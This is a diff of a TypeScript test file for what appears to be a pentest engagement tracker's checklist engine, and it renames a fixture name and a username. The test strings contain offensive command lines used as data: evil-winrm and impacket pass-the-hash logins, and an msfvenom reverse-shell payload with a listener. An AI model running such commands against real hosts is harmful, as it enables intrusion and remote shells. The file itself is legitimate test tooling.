@@ -15,7 +15,7 @@ import {
 } from '../../../engines/checklist';
 
 const engagement = (over: Partial<Engagement> = {}): Engagement => ({
-  id: 'lab', name: 'Lumen', kind: 'lab', client: null, subLabel: null, scopeCidrs: [], domain: null, startsAt: null,
+  id: 'lab', name: 'Acme', kind: 'lab', client: null, subLabel: null, scopeCidrs: [], domain: null, startsAt: null,
   endsAt: null, timeboxStart: null, timeboxMinutes: null, status: 'active', createdAt: 0, updatedAt: 0,
   lastActivityAt: null, lastRanOn: null, msfHostId: null, ...over,
 });
@@ -214,11 +214,11 @@ describe('ticksForEntry (commands)', () => {
 
   it('a login attempt does not tick the credential-login goal', () => {
     const foot = (line: string) => ticks(line).filter((x) => x.goalId.startsWith('h-foot-'));
-    expect(foot("evil-winrm -i 10.0.0.5 -u jace -p 'Pw1!'")).toEqual([]);
-    expect(foot('evil-winrm -i 10.0.0.5 -u jace -H abc')).toEqual([]);
-    expect(foot("impacket-psexec corp.local/jace:'Pw1!'@10.0.0.6")).toEqual([]);
-    expect(foot('impacket-wmiexec -hashes :abc corp.local/jace@10.0.0.6')).toEqual([]);
-    expect(foot('ssh jace@10.0.0.50')).toEqual([]);
+    expect(foot("evil-winrm -i 10.0.0.5 -u jay -p 'Pw1!'")).toEqual([]);
+    expect(foot('evil-winrm -i 10.0.0.5 -u jay -H abc')).toEqual([]);
+    expect(foot("impacket-psexec corp.local/jay:'Pw1!'@10.0.0.6")).toEqual([]);
+    expect(foot('impacket-wmiexec -hashes :abc corp.local/jay@10.0.0.6')).toEqual([]);
+    expect(foot('ssh jay@10.0.0.50')).toEqual([]);
     // payloads and listeners name no target
     expect(ticks('msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe -o shell.exe')).toEqual([]);
     expect(ticks('penelope -p 443')).toEqual([]);
